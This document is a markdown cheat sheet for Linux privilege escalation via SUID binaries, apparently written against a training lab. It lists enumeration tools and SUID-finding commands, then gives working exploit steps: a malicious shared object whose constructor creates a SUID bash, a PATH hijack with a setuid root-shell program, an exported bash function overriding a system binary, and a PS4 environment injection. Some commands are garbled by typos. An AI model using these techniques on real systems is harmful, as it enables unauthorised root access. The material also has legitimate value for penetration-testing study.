
 * [Automation-Tools](#Automation-Tools)
 * [Suid](#Suid)
 * 

 ## Automation Tools
 
There are many scripts that you can execute on a linux machine which automatically find information weekpoint and many more 

- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)

- [linux-exploit-suggester - Linux exploit-suggester & privilege Escalation](https://github.com/mzet-/linux-exploit-suggester)

- [linux-exploit-suggester2 - Linux exploit-suggester2 & privilege Escalation](https://github.com/jondonas/linux-exploit-suggester-2)

- [pspy - unprivileged Linux process snooping -                               ](https://github.com/DominicBreuker/pspy)





   


  ## Suid
 
 Enumeration
    
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -type f -perm -04000 -ls 2>/dev/null
        
        
Resource 
   
     https://gtfobins.github.io/
       
Shared Object Injection
  
    find / -type f -perm -04000 -ls 2>/dev/null
    strace <PATH=2>&1
       
       
TYPE COMMAND 
  
    strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
  
  
OUTPUT
 
         
         
## access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
## open("/etc/ld.so.cache", O_RDONLY)      = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libdl.so.2", O_RDONLY)       = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libm.so.6", O_RDONLY)        = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
## access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
## open("/lib/libc.so.6", O_RDONLY)        = 3
## open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)


Exploit Shared Object Injection
   
   mkdir /home/user/.config
       
   Create C file Type Some Commands
       
    #include <stdio.h>
    #include <stdlib.h>

    static void inject()__attribute__((constructor));

    void inject() {
      system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
    }
   
 Complie

    gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c


 Run The Program
  
    /usr/local/bin/suid-so

Environment Variables
                
    env
    find / -type f -perm -04000 -ls 2>/dev/null
    /usr/local/bin/suid-env
    strings /usr/local/bin/suid-env
    echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
    gcc /tmp/service.c -o /tmp/service
    export PATH=/tmp:$PATH
    print $PATH
    /usr/local/bin/suid-env
    function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
    export -f /usr/sbin/service
    /usr/local/bin/suid-env2



   
   evn
     
   This will not work on Bash versions 4.4 and above
  ''' 
   When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
   ,,,
   Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of          /bin/bash:
 
      env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
      /tmp/rootbash -p
     
    





















